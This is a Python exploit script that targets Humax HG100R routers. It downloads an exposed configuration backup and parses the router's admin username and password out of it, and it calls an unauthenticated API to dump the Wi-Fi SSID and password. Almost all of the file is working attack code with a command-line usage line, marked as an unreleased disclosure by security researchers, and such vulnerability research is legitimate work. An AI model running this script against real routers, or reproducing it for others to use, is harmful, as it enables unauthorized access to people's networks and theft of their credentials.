#!/usr/bin/env python

import sys
import base64
import requests
import json

"""
Exploit to retrieve the wlan setup information (including password) and console administrative password from routers.
Affected hardware/vendor: Humax HG100R

Vulnerability found by Thiago Musa and Felipe Cerqueira in May/2017.

Author: Felipe Cerqueira - FSantos [at] TrustWave.com

NOT PUBLIC YET - PLEASE, DO NOT DISTRIBUTE
"""


def retrieve_backup_bin(base_url):
    """
    Function to retrieve the bin configuration and get the admin password

    :param base_url: Base url address
    :type base_url: str
    :return: None
    """

    url = base_url + '/' + '/view/basic/GatewaySettings.bin'
    r = requests.get(url)

    data = r.content
    b64_decoded = base64.b64decode(data[96:])
    """
    :type b64_decoded: str
    """

    idx = b64_decoded.find('MLog')
    if idx < 0:
        raise ExploitFailed('Error trying to parse GatewaySettings.bin')

    idx_end_username = b64_decoded[idx + 8:].find('\x00')
    if idx_end_username < 0:
        raise ExploitFailed('Error trying to parse GatewaySettings.bin')

    idx_end_username += idx + 8
    username = b64_decoded[idx + 8:idx_end_username]

    idx_begin_password = b64_decoded[idx_end_username:].find('\x00')
    if idx_begin_password < 0:
        raise ExploitFailed('Error trying to parse GatewaySettings.bin')

    idx_begin_password += idx_end_username
    idx_end_password = b64_decoded[idx_begin_password + 1:].find('\x00')

    if idx_end_password < 0:
        raise ExploitFailed('Error trying to parse GatewaySettings.bin')

    idx_end_password += idx_begin_password

    password = b64_decoded[idx_begin_password + 2:idx_end_password + 2]

    print '-- ROUTER CONSOLE CREDENTIALS --'
    print 'Username: %s' % username
    print 'Password: %s' % password


def retrieve_router_setup_info(base_url):
    """
    Function to retrieve the wifi SSID and password

    :param base_url: Base url address
    :type base_url: str
    :return: None
    """

    print '-- ROUTER SETUP INFO --'
    r = requests.post(base_url + '/api', json={"method": "QuickSetupInfo", "id": 90, "jsonrpc": "2.0"})
    print json.dumps(r.json(), sort_keys=True, indent=2)
    print ''


class ExploitFailed(Exception):
    pass


if __name__ == '__main__':
    print '*** ROUTER HUMAX REMOTE EXPLOIT'
    print '*** by Felipe Cerqueira - skylazart[at]gmail.com / FSantos[at]trustwave.com'
    print '*** May/2017'
    print ''

    if len(sys.argv) == 1:
        print 'Usage: %s URL' % sys.argv[0]
        sys.exit(1)

    url = sys.argv[1]
    retrieve_router_setup_info(url)
    retrieve_backup_bin(url)
